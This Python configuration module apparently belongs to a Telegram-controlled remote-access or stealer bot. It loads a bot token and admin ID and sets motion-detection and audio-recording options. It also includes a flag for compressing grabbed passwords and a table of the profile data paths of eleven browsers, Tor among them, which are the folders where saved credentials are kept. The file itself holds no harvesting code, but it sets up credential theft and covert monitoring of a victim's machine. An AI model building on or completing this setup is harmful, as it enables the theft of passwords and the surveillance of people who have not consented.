"""
Configuration Module
Load settings từ .env và constants

Developer: TsByin
"""

import os
import logging
import sys
from pathlib import Path
from dotenv import load_dotenv

# Determine base directory (works when frozen)
if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Load .env file from base dir (important for frozen EXE)
env_path = Path(BASE_DIR) / '.env'
load_dotenv(dotenv_path=env_path)

# ==============================================================================
# LOGGING CONFIGURATION
# ==============================================================================

LOG_FILE = os.path.join(BASE_DIR, os.getenv('LOG_FILE', 'bot.log'))

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# ==============================================================================
# TELEGRAM BOT SETTINGS
# ==============================================================================

API_TOKEN = os.getenv('API_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', 0))

if not API_TOKEN:
    logger.error("❌ API_TOKEN not found in .env file")
    raise ValueError("API_TOKEN is required")

if not ADMIN_ID:
    logger.error("❌ ADMIN_ID not found in .env file")
    raise ValueError("ADMIN_ID is required")

logger.info(f"✅ Bot configured for Admin ID: {ADMIN_ID}")

# ==============================================================================
# SYSTEM MONITOR SETTINGS
# ==============================================================================

MONITOR_INTERVAL = int(os.getenv('MONITOR_INTERVAL', 1))
CPU_ALERT_THRESHOLD = int(os.getenv('CPU_ALERT_THRESHOLD', 95))
CPU_ALERT_COOLDOWN = int(os.getenv('CPU_ALERT_COOLDOWN', 300))
MOTION_DETECT_AREA = int(os.getenv('MOTION_DETECT_AREA', 3000))
MOTION_DETECT_COOLDOWN = int(os.getenv('MOTION_DETECT_COOLDOWN', 5))

# ==============================================================================
# FILE PATHS
# ==============================================================================

BLOCKED_FILE = os.path.join(BASE_DIR, os.getenv('BLOCKED_FILE', 'blocked.json'))
SETTINGS_FILE = os.path.join(BASE_DIR, os.getenv('SETTINGS_FILE', 'settings.json'))


# ==============================================================================
# PERFORMANCE SETTINGS
# ==============================================================================

MAX_WORKERS = int(os.getenv('MAX_WORKERS', 4))
DATABASE_TIMEOUT = int(os.getenv('DATABASE_TIMEOUT', 10))
GRAB_PASSWORD_COMPRESS = os.getenv('GRAB_PASSWORD_COMPRESS', 'true').lower() == 'true'

# ==============================================================================
# SYSTEM BROWSER PATHS
# ==============================================================================

BROWSER_PATHS = {
    'Chrome': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
    'Edge': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
    'Edge Dev': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Microsoft', 'Edge Dev', 'User Data'),
    'Edge Canary': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Microsoft', 'Edge Canary', 'User Data'),  
    'Edge Beta': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Microsoft', 'Edge Beta', 'User Data'),
    'Brave': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'CocCoc': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'CocCoc', 'Browser', 'User Data'),
    'Firefox': os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
    'Vivaldi': os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Vivaldi', 'User Data'),
    'Opera': os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
    'Tor': os.path.join(os.path.expanduser('~'), 'Desktop', 'Tor Browser', 'Browser', 'TorBrowser', 'Data', 'Browser', 'profile.default')
}

# ==============================================================================
# GLOBAL STATE
# ==============================================================================

START_TIME = None
AUDIO_AVAILABLE = False
TTS_AVAILABLE = False

try:
    import pyaudio
    AUDIO_AVAILABLE = True
except ImportError:
    logger.warning("⚠️ PyAudio not available - Audio recording disabled")

try:
    import pyttsx3
    TTS_AVAILABLE = True
except ImportError:
    logger.warning("⚠️ PyTTSx3 not available - Text-to-speech disabled")

logger.info(f"🔧 Audio Available: {AUDIO_AVAILABLE} | TTS Available: {TTS_AVAILABLE}")
# ════════════════════════════════════════════════
# Developer: TsByin
# Module: Configuration Loader & Setup
# ════════════════════════════════════════════════